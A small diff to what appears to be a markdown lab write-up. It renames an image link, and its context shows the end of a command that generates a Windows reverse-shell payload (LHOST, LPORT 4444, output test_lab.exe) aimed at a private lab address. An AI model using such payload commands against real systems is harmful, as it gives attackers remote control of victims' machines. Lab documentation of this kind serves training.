@@ -71,7 +71,7 @@ LHOST=172.16.195.128 LPORT=4444 \
 -f exe -o test_lab.exe
 ```
 
-![Payload](_payload.png)
+![Payload](payload.png)
 
 ---
 
